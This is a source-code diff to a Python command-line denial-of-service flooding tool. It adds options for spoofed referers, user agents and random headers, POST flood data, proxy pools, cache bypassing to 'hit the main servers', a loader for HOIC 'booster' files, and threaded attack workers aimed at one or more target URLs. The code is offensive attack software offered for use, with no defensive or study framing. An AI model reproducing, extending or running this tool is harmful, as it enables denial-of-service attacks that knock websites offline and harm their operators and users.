@@ -68,6 +68,7 @@ try:
     from src.database import * # database stuff
     from src.argparser import *
     from src.methods import *
+    from src.booster import *
 except Exception as e:
     print(' - Error, failed to import core modules.')
     sys.exit(f' - Stacktrace: \n{str(e).rstrip()}')
@@ -80,10 +81,26 @@ def main(args):
     if not args['target_url']: # check if the "-t/--target-url" argument has been passed
         sys.exit('\n - Please specify your target.\n')
     
-    if ',' in args['target_url']: # multiple targets specified
-        Core.targets = args['target_url'].split(',')
-    else:
-        Core.targets = [args['target_url']]
+    if ',' in args['target_url']: Core.targets = args['target_url'].split(',') # multiple targets specified
+    else: Core.targets = args['target_url']
+    
+    if args['referer_list']:
+        if ',' in args['referer_list']: Core.referer_list = args['referer_list'].split(',')
+        elif args['referer_list'] != None:  Core.referer_list = args['referer_list']
+        else: Core.referer_list = None
+    else: Core.referer_list = None
+
+    if args['useragent_list']:
+        if ',' in args['useragent_list']: Core.useragent_list = args['useragent_list'].split(',')
+        elif args['useragent_list'] != None: Core.useragent_list = args['useragent_list']
+        else: Core.useragent_list = None
+    else: Core.useragent_list = None
+
+    if args['random_headers']:
+        if ',' in args['random_headers']: Core.random_headers = args['random_headers'].split(',')
+        elif args['random_headers'] != None: Core.random_headers = args['random_headers']
+        else: Core.random_headers = None
+    else: Core.random_headers = None
 
     attack_method = args['method'].upper()
     if not Core.methods.get(attack_method): # if the method does not exist
@@ -91,6 +108,8 @@ def main(args):
     
     Core.bypass_cache = args['bypass_cache']
     Core.proxy_proto = args['proxy_proto']
+    Core.attack_method = args['method']
+    Core.post_buffer = args['post_buffer']
 
     if args['proxy_file']:
         Core.proxy_pool = []
@@ -105,10 +124,35 @@ def main(args):
 
     print(' + Current attack configuration:')
 
-    if not Core.targets:
-        print(f'   - Target: {args["target_url"]}')
-    else:
-        print(f'   - Targets: {", ".join(Core.targets)}')
+    if not Core.targets: print(f'   - Target: {args["target_url"]}')
+    else: print(f'   - Targets: {", ".join(Core.targets) if len(Core.targets) < 3 else len(Core.targets)}')
+    
+    if not Core.referer_list: print(f'   - Referer: randomly chosen')
+    else: print(f'   - Referers: {", ".join(Core.referer_list) if len(Core.referer_list) < 3 else len(Core.referer_list)}')
+    
+    if not Core.useragent_list: print(f'   - Useragent: randomly chosen')
+    else: print(f'   - Useragents: {", ".join(Core.useragent_list) if len(Core.useragent_list) < 3 else len(Core.useragent_list)}')
+
+    if not Core.random_headers: print(f'   - Random headers: randomly chosen')
+    else: print(f'   - Random headers: {", ".join(Core.random_headers) if len(Core.random_headers) < 3 else len(Core.random_headers)}')
+
+    if args['headers']:
+        headersdict = {}
+        for header in args['headers']:
+            key, value = header.split(':', 1)
+
+            headersdict.update({key: value})
+
+        Core.headers = headersdict
+    
+    if args['random_headers']:
+        rand_headerslist = []
+        for header in args['random_headers']:
+            key, value = header.split(': ', 1)
+
+            rand_headerslist.append({key: value})
+
+        Core.random_headers = rand_headerslist
 
     print(f'   - Duration: {utils().Sec2Str(args["duration"])}')
     print(f'   - Workers: {str(args["workers"])}')
@@ -124,7 +168,7 @@ def main(args):
         if not input('\n + Correct? (Y/n) ').lower().startswith('y'):
             sys.exit('\n')
 
-    if not args.get('IS_FROM_ID'): # skip if we are running the attack from a pre-existing id
+    if not args.get('IS_FROM_ID') and not args.get('IS_FROM_BOOSTER'): # skip if we are running the attack from a pre-existing id or from a hoic booster
         print('\n + Creating unique identifier for attack')
         tohash = args['target_url'] + str(args['duration']) + args['method'] + str(args['workers']) + str(args['bypass_cache']) + str(args['yes_to_all'])
         Core.attack_id = attack_id = hashlib.sha1(tohash.encode()).hexdigest()
@@ -133,6 +177,8 @@ def main(args):
         database().save_log({
             'timestamp': datetime.now().strftime('%m/%d/%Y, %H:%M:%S'),
             'target': args['target_url'],
+            'referer': args['referer_list'],
+            'useragent': args['useragent_list'],
             'duration': args['duration'],
             'attack_vector': args['method'],
             'workers': args['workers'],
@@ -140,18 +186,18 @@ def main(args):
             'proxy_proto': args['proxy_proto'],
             'bypass_cache': args['bypass_cache'],
             'yes_to_all': args['yes_to_all'],
-            'http_ver': args['http_ver']
+            'http_ver': args['http_ver'],
+            'rand_headers': args['rand_headers']
         })
     else:
         attack_id = args['UNIQUE_ATTACK_ID']
     
     print(f' + Attack ID: {attack_id}')
-
     Core.infodict[attack_id] = {
         'req_sent': 0, # requests sent (OPTIONAL)
         'req_fail': 0, # requests failed (OPTIONAL)
         'conn_opened': 0, # connections opened (OPTIONAL)
-        'identities_changed': 0, # amount of times we shwitched identities (OPTINAL)
+        'identities_changed': 0, # amount of times we switched identities (OPTINAL)
         'req_total': 0 # total amount of requests/packets sent (REQUIRED)
     }
 
@@ -165,14 +211,12 @@ def main(args):
     if not args['yes_to_all']:
         input('\n + Ready? (Press ENTER) ')
 
-    Core.bypass_cache = args['bypass_cache']
-
     print('\n + Building threads, this could take a while.')
     stoptime, threadbox = time.time() + args['duration'], []
     for _ in range(args["workers"]):
         try:
             kaboom = threading.Thread(
-                target=Core.methods[attack_method]['func'], # parse the function
+                target=Core.methods[Core.attack_method]['func'], # parse the function
                 args=(
                     attack_id, # attack id
                     choice(Core.targets), # pick a random target from the list
@@ -286,19 +330,23 @@ if __name__ == '__main__':
     ''', argument_default=argparse.SUPPRESS, allow_abbrev=False)
 
         # add arguments
-        parser.add_argument('-t',       '--target',          action='store',      dest='target_url',    metavar='target url',   type=str,    help='Target url(s) to attack, seperated by ","', default=None)
-        parser.add_argument('-d',       '--attack-duration', action='store',      dest='duration',      metavar='duration',     type=int,    help='Attack length in seconds', default=100)
-        parser.add_argument('-w',       '--workers',         action='store',      dest='workers',       metavar='workers',      type=int,    help='Number of threads/workers to spawn', default=40)
-        parser.add_argument('-m',       '--method',          action='store',      dest='method',        metavar='method',       type=str,    help='Attack method/vector to use', default='GET')
-        parser.add_argument(            '--proxy-file',      action='store',      dest='proxy_file',    metavar='location',     type=str,    help='Location of the proxy file to use', default=None)
-        parser.add_argument(            '--proxy-proto',     action='store',      dest='proxy_proto',   metavar='protocol',     type=str,    help='Proxy protocol (SOCKS4, SOCKS5, HTTP)', default='SOCKS5')
-        #parser.add_argument(            '--driver-engine',   action='store',      dest='driver_engine', metavar='driver engine',type=str,    help='Driver engine to use (CHROME for Chrome, GECKO for Firefox)', default='CHROME')
-        parser.add_argument('-logs',    '--list-logs',       action='store_true', dest='list_logs',                                          help='List all attack logs', default=False)
-        parser.add_argument('-methods', '--list-methods',    action='store_true', dest='list_methods',                                       help='List all the attack methods', default=False)
-        parser.add_argument('-bc',      '--bypass-cache',    action='store_true', dest='bypass_cache',                                       help='Try to bypass any caching systems to ensure we hit the main servers', default=True)
-        parser.add_argument('-y',       '--yes-to-all',      action='store_true', dest='yes_to_all',                                         help='Skip any user prompts, and just launch the attack', default=False)
-        parser.add_argument(            '--http-version',    action='store',      dest='http_ver',      metavar='http version', type=str,    help='Set the HTTP protocol version', default='1.1')
-        parser.add_argument('-id',      '--launch-from-id',  action='store',      dest='launch_from_id',metavar='attack id',    type=str,    help='Attack ID to use, to parse attack configuration from', default=None)
+        parser.add_argument('-t',       '--target',          action='store',      dest='target_url',    metavar='target url(s)',    type=str,  help='Target url(s) to attack, seperated by ","', default=None)
+        parser.add_argument(            '--referers',        action='store',      dest='referer_list',  metavar='referer(s)',       type=str,  help='Referer(s) to use when attacking, seperated by ","', default=None)
+        parser.add_argument(            '--useragents',      action='store',      dest='useragent_list',metavar='useragent(s)',     type=str,  help='Useragent(s) to use when attacking, seperated by ","', default=None)
+        parser.add_argument('-d',       '--attack-duration', action='store',      dest='duration',      metavar='duration',         type=int,  help='Attack length in seconds', default=100)
+        parser.add_argument('-w',       '--workers',         action='store',      dest='workers',       metavar='workers',          type=int,  help='Number of threads/workers to spawn', default=40)
+        parser.add_argument('-m',       '--method',          action='store',      dest='method',        metavar='method',           type=str,  help='Attack method/vector to use', default='GET')
+        parser.add_argument(            '--proxy-file',      action='store',      dest='proxy_file',    metavar='location',         type=str,  help='Location of the proxy file to use', default=None)
+        parser.add_argument(            '--proxy-proto',     action='store',      dest='proxy_proto',   metavar='protocol',         type=str,  help='Proxy protocol (SOCKS4, SOCKS5, HTTP)', default='SOCKS5')
+        parser.add_argument('-logs',    '--list-logs',       action='store_true', dest='list_logs',                                            help='List all attack logs', default=False)
+        parser.add_argument('-methods', '--list-methods',    action='store_true', dest='list_methods',                                         help='List all the attack methods', default=False)
+        parser.add_argument('-bc',      '--bypass-cache',    action='store_true', dest='bypass_cache',                                         help='Try to bypass any caching systems to ensure we hit the main servers', default=True)
+        parser.add_argument('-y',       '--yes-to-all',      action='store_true', dest='yes_to_all',                                           help='Skip any user prompts, and just launch the attack', default=False)
+        parser.add_argument(            '--http-version',    action='store',      dest='http_ver',      metavar='http version',     type=str,  help='Set the HTTP protocol version', default='1.1')
+        parser.add_argument('-id',      '--launch-from-id',  action='store',      dest='launch_from_id',metavar='attack id',        type=str,  help='Attack ID to use, to parse attack configuration from', default=None)
+        parser.add_argument(            '--hoic-booster',    action='store',      dest='hoic_booster',  metavar='location',         type=str,  help='HOIC booster file to use when attacking, can result in malicious code execution so make sure its clean!', default=None)
+        parser.add_argument(            '--post-data',       action='store',      dest='post_buffer',   metavar='data',             type=str,  help='Data to send with POST floods', default=None)
+        parser.add_argument(            '--rand-headers',    action='store',      dest='rand_headers',  metavar='random header(s)', type=str,  help='Random header(s) to choose when attacking, seperated by ","', default=None)
         args = vars(parser.parse_args()) # parse the arguments
 
         if args['list_logs']:
@@ -322,6 +370,20 @@ if __name__ == '__main__':
                 print(f'{method}: {items["info"]}')
 
             sys.exit('\n')
+        
+        if args['hoic_booster']:
+            booster_path = args['hoic_booster']
+            if not os.path.isfile(booster_path):
+                sys.exit(f'\n - Could not find "{booster_path}"\n')
+
+            print('\n + Parsing booster file')
+            booster = Booster(booster_path)
+
+            booster.get()
+            args.update(booster.args())
+
+            args['IS_FROM_BOOSTER'] = True
+            args['UNIQUE_ATTACK_ID'] = utils().make_id()
 
         if args['launch_from_id']: # id has been specified
             attack_id = args['launch_from_id']
